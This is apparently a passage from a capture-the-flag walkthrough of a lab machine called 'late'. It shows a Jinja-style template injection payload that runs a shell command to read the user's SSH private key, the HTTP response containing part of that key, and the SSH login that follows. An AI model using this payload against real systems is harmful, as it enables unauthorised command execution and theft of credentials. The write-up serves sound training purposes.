Play around with the command execution for a bit and leak the user's SSH private key. Use it to get a shell
```python
# payload
{{ namespace.__init__.__globals__.os.popen('''cat ~/.ssh/id_rsa''').read() }}
```
- Note the ''' allows for more commands to be used than only the single ticks
- Also note, if box resets and there is no private key there, the ssh oneliner I tried may have been what put it there
```ssh-keygen -t rsa -f "$HOME/.ssh/id_rsa" -P "" && cat ~/.ssh/id_rsa.pub```
Output from payload:
```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 11 May 2022 03:48:50 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 1688
Connection: close
Content-Disposition: attachment; filename=results.txt
Last-Modified: Wed, 11 May 2022 03:48:50 GMT
Cache-Control: no-cache
ETag: "1652240930.4815707-1688-367136290"

<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWc
```
SSH shell & user.txt
```bash
ssh -i late svc_acc@10.10.11.156

svc_acc@late:~$ ls
app  user.txt
svc_acc@late:~$
```
